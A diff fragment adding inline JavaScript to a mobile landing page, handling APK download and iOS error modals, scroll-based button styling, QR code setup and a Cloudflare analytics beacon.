+        if (IS_IOS && !IS_SAFARI) {
+          if (modalError) modalError.classList.add('show');
+          return;
+        }
+
+        if (mobileLoading) mobileLoading.style.display = 'block';
+        if (modalElement) modalElement.classList.add('show');
+
+        // Immediately show download button
+        if (downloadContainer) downloadContainer.style.display = 'flex';
+        if (modalButtonApk) {
+          modalButtonApk.style.pointerEvents = 'auto';
+          modalButtonApk.style.opacity = '1';
+        }
+      });
+
+      // Modal backdrop click -> close
+      if (modalBackdrop) {
+        modalBackdrop.addEventListener('click', function() {
+          if (modalLoading) modalLoading.style.display = 'none';
+          if (mobileLoading) mobileLoading.style.display = 'none';
+          if (modalElement) modalElement.classList.remove('show');
+          isDownloading = false;
+        });
+      }
+
+      // Download button click in modal
+      if (modalButtonApk) {
+        modalButtonApk.addEventListener('click', function() {
+          if (isDownloading) return;
+          isDownloading = true;
+          startDownload();
+        });
+      }
+
+      // Error modal
+      if (modalErrorBackdrop) {
+        modalErrorBackdrop.addEventListener('click', function() {
+          if (modalError) modalError.classList.remove('show');
+        });
+      }
+      if (modalErrorButton) {
+        modalErrorButton.addEventListener('click', function() {
+          if (modalError) modalError.classList.remove('show');
+        });
+      }
+
+      // ========== Scroll Behaviors ==========
+      var goTopContainer = document.querySelector('.main-mobile__install-guide--go-top');
+      var goTopBtn = document.querySelector('.main-mobile__install-guide--go-top--btn');
+      var ctaContainer = document.querySelector('.main-mobile__cta-container');
+      var ctaButton = document.querySelector('.main-mobile__cta');
+      var ctaNotice = document.querySelector('.main-mobile__cta--notice');
+      var shadowOverlay = document.querySelector('.main-mobile__shadow');
+      var installGuide = document.getElementById('install-guide');
+
+      if (goTopBtn) {
+        goTopBtn.style.display = 'none';
+        goTopBtn.style.opacity = '0';
+        goTopBtn.style.transition = 'opacity 0.3s ease-in-out';
+
+        goTopBtn.addEventListener('click', function() {
+          window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+      }
+
+      if (ctaNotice) {
+        ctaNotice.addEventListener('click', function() {
+          if (installGuide) {
+            var targetY = installGuide.getBoundingClientRect().top + window.scrollY;
+            window.scrollTo({ top: targetY, behavior: 'smooth' });
+          }
+        });
+      }
+
+      var scrollTracked = false;
+      document.addEventListener('scroll', function() {
+        if (window.scrollY > 0) {
+          if (goTopContainer) goTopContainer.style.bottom = '90px';
+          if (goTopBtn) {
+            goTopBtn.style.display = 'block';
+            goTopBtn.style.opacity = '1';
+          }
+          if (shadowOverlay) shadowOverlay.style.display = 'block';
+
+          if (ctaButton) {
+            ctaButton.style.position = 'fixed';
+            ctaButton.style.gap = '12px';
+            ctaButton.style.padding = '24px 0 24px 0';
+            ctaButton.style.background = 'linear-gradient(180deg, rgba(0, 0, 0, 0.00) 14.47%, #232323 41.32%)';
+          }
+          if (ctaNotice) ctaNotice.style.display = 'none';
+
+          if (ctaContainer) {
+            var scrollRatio = Math.min(window.scrollY / 300, 1);
+            ctaContainer.style.height = (150 * (1 - scrollRatio)) + 'px';
+          }
+
+          if (!scrollTracked) scrollTracked = true;
+        } else {
+          if (goTopContainer) goTopContainer.style.bottom = '120px';
+          if (goTopBtn) {
+            goTopBtn.style.opacity = '0';
+            goTopBtn.style.display = 'none';
+          }
+          if (shadowOverlay) shadowOverlay.style.display = 'none';
+
+          if (ctaButton) {
+            ctaButton.style.position = '';
+            ctaButton.style.gap = '4px';
+            ctaButton.style.background = 'transparent';
+          }
+          if (ctaNotice) ctaNotice.style.display = 'block';
+          if (ctaContainer) ctaContainer.style.height = '120px';
+        }
+      });
+    }
+
+    // ========== Init ==========
+    function init() {
+      generateQRCode(window.location.href);
+      generateBackgroundImage();
+
+      if (IS_IOS || IS_SAFARI) {
+        var iosStep = document.querySelector('.ios-step');
+        var apkStep = document.querySelector('.apk-step');
+        if (iosStep) iosStep.style.display = 'block';
+        if (apkStep) apkStep.style.display = 'none';
+      }
+
+      initMobileInteractions();
+    }
+
+    // Run on load
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', init);
+    } else {
+      init();
+    }
+  })();
+  </script>
+
+
+
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"d8d0a4b6e3294b56990fe4f7e7e0a13a","r":1}' crossorigin="anonymous"></script>
+</body></html>
